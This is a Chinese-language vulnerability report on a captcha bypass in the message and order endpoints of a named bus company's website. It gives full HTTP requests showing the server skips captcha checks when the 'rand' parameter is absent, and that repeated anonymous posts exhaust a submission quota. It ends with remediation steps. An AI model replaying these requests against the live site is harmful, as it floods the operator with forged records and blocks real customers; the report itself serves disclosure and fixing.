# 雅星公交网站留言和订购接口存在验证码绕过漏洞

**漏洞名称：** 雅星公交网站留言和订购接口存在验证码绕过漏洞

**漏洞等级：** 中危

**漏洞类型：** 业务逻辑 / 验证码校验绕过

**漏洞URL：**

`https://www.yaxingbus.com/core/control/wcm_common_leave_message/control_solu.jsp`

`https://www.yaxingbus.com/core/control/wcm_cms_product_order/control_dinggou.jsp`

## 详细描述

网站的在线留言和网上订购接口可以匿名 POST，不需要 Cookie、Token 或 Referer 校验。

服务端只有在请求体中出现 `rand` 参数时才校验验证码：

- 完全不传 `rand`，或传 `rand=` 空值，直接进入成功分支，返回 `ok`；
- 传错误的 `rand`，返回 `rand_wrong`；
- 必填字段缺失，返回 `fail`。

三种返回结果说明 `ok` 是真实写入分支，不是固定输出。攻击者可以用脚本绕过验证码，批量提交留言和订购记录；提交约 20 次后，接口还会进入 `countMore` / `out_size` 配额分支，影响正常用户提交。

## 复现步骤

前置条件：不需要账号，不需要 Cookie。

### 第 1 步：匿名提交留言，不传验证码

完整请求包：

```http
POST /core/control/wcm_common_leave_message/control_solu.jsp HTTP/1.1
Host: www.yaxingbus.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Connection: close

method=leaveMessage&obj.name=ATXNAME&obj.telephone=13800001111&obj.email=t@example.com&obj.address=YY&obj.reply_content=&obj.content=atx-probe-semantic
```

响应包：

```http
HTTP/1.1 200 OK
Content-Length: 14

（响应体原始字节：\r\n\r\n\r\n\r\n\r\nok\r\n）
ok
```

请求中没有 `rand`，服务端仍返回 `ok`，说明没有验证码也进入了成功分支。

### 第 2 步：同一个请求加上错误验证码

保持请求体不变，在末尾追加：

```text
&rand=0000
```

完整请求体：

```text
method=leaveMessage&obj.name=ATXNAME&obj.telephone=13800001111&obj.email=t@example.com&obj.address=YY&obj.reply_content=&obj.content=atx-probe-semantic&rand=0000
```

响应包：

```http
HTTP/1.1 200 OK

（响应体原始字节：\r\n\r\n\r\n\r\n\r\nrand_wrong\r\n）
rand_wrong
```

对比第 1 步可以确认：服务端确实有 `rand` 比对逻辑，但只有请求里出现 `rand` 时才执行；不传或传空值就跳过。

### 第 3 步：匿名提交订购请求

完整请求包：

```http
POST /core/control/wcm_cms_product_order/control_dinggou.jsp HTTP/1.1
Host: www.yaxingbus.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Connection: close

link_man=ATXMAN&link_phone=13800001111&province_name=JS&city_name=YZ&cat_name=bus&name=ATXPROD&content=atx-base
```

响应包：

```http
HTTP/1.1 200 OK
Content-Length: 12

（响应体原始字节：\r\n\r\n\r\n\r\n\r\nok）
ok
```

同样不传 `rand`，接口直接返回 `ok`。

### 第 4 步：确认 `ok` 是真实业务分支

只保留必填字段提交：

```text
link_man=ATXMAN&link_phone=13800001111
```

响应变为：

```text
fail
```

说明 `ok`、`fail`、`rand_wrong` 是三个真实业务分支，`ok` 不是固定页面或空白响应。

### 第 5 步：观察配额闸门

连续提交约 20 次后，再执行第 1 步和第 3 步：

```text
control_solu.jsp    → countMore
control_dinggou.jsp → out_size
```

接口不再返回 `ok`，说明匿名提交已经消耗了服务端的计数配额，会影响正常用户提交。

## 影响范围

匿名攻击者可以绕过验证码，批量写入伪造留言和订购记录，污染客服、销售和运营数据；持续提交还可能耗尽接口配额，导致真实客户的留言和订购通道不可用。

当前未取得留言或订购内容被匿名读取的证据，因此不构成数据泄露；影响集中在数据完整性和可用性。

## 修复方案

1. 服务端无条件校验验证码，不能以 `rand` 参数是否存在作为是否校验的条件；`rand` 缺失或为空必须直接拒绝。
2. 验证码答案绑定服务端会话，并设置一次性使用和有效期，不能只依赖前端字段。
3. 对留言和订购接口增加频率限制、字段长度校验和异常提交审计。
